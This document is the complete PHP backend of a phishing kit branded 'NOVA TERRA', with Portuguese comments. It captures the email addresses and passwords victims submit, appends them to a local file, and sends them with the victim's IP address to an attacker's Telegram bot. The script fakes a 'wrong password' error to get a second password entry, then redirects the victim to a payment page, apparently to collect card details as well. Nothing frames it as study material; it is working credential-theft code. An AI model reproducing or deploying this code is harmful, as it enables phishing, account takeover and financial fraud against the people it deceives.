<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Incluir configurações do Telegram
require_once 'config_telegram.php';

// Função para enviar mensagem para o Telegram
function enviarParaTelegram($token, $chat_id, $mensagem) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    
    $dados = array(
        'chat_id' => $chat_id,
        'text' => $mensagem,
        'parse_mode' => 'HTML'
    );
    
    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($dados)
        )
    );
    
    $context = stream_context_create($options);
    $resultado = file_get_contents($url, false, $context);
    
    return $resultado !== false;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['user'];
    $senha = $_POST['pass'];
    
    // Definir o caminho completo do arquivo
    $arquivo = __DIR__ . "/dados_login.txt";
    
    // Verificar se já existe uma entrada para este email
    $conteudo = file_exists($arquivo) ? file_get_contents($arquivo) : "";
    $segunda_tentativa = strpos($conteudo, "Email: " . $email) !== false;
    
    if ($segunda_tentativa) {
        // Encontrar a senha anterior
        preg_match('/Senha: (.*?) \|/', $conteudo, $matches);
        $senha_anterior = isset($matches[1]) ? $matches[1] : "";
        
        // Formatar os dados com a senha2 como confirmação
        $dados = "Email: " . $email . " | Senha: " . $senha_anterior . " | senha2:" . $senha . " | Data: " . date('Y-m-d H:i:s') . "\n";
        
        // Mensagem para o Telegram (segunda tentativa)
        $mensagem_telegram = "🔐 <b>NOVA TERRA - SEGUNDA TENTATIVA</b>\n\n";
        $mensagem_telegram .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
        $mensagem_telegram .= "🔑 <b>Senha 1:</b> " . htmlspecialchars($senha_anterior) . "\n";
        $mensagem_telegram .= "🔑 <b>Senha 2:</b> " . htmlspecialchars($senha) . "\n";
        $mensagem_telegram .= "📅 <b>Data:</b> " . date('d/m/Y H:i:s') . "\n";
        $mensagem_telegram .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'];
        
    } else {
        // Primeira tentativa
        $dados = "Email: " . $email . " | Senha: " . $senha . " | Data: " . date('Y-m-d H:i:s') . "\n";
        
        // Mensagem para o Telegram (primeira tentativa)
        $mensagem_telegram = "🔐 <b>NOVA TERRA - PRIMEIRA TENTATIVA</b>\n\n";
        $mensagem_telegram .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
        $mensagem_telegram .= "🔑 <b>Senha:</b> " . htmlspecialchars($senha) . "\n";
        $mensagem_telegram .= "📅 <b>Data:</b> " . date('d/m/Y H:i:s') . "\n";
        $mensagem_telegram .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'];
    }
    
    // Tentar salvar os dados no arquivo
    file_put_contents($arquivo, $dados, FILE_APPEND | LOCK_EX);
    
    // Enviar dados para o Telegram
    if (!empty($telegram_bot_token) && !empty($telegram_chat_id) && 
        $telegram_bot_token !== "SEU_BOT_TOKEN_AQUI" && 
        $telegram_chat_id !== "SEU_CHAT_ID_AQUI") {
        enviarParaTelegram($telegram_bot_token, $telegram_chat_id, $mensagem_telegram);
    }
    
    // Redirecionar baseado na tentativa
    if ($segunda_tentativa) {
        // Se for segunda tentativa, redireciona para a pasta pagamentos
        header("Location: pagamento");
    } else {
        // Se for primeira tentativa, mostra erro de senha incorreta
        header("Location: index.html?error=1");
    }
    
    exit();
} else {
    // Se não for POST, redireciona para a página inicial
    header("Location: index.html");
    exit();
}
?>